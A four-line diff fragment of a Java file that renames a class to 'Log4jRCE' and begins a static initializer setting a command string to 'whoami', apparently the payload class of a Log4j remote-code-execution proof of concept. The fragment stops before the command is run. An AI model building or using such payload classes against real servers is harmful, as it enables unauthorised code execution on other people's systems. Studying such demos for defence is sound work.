@@ -1,4 +1,4 @@
-public class Log4j {
+public class Log4jRCE {
     static {
         try {
             String cmd = "whoami";
